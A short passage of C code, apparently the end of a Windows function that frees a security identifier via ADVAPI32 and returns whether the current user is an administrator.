    ADVAPI32$FreeSid ( sid );
    return is_admin;
}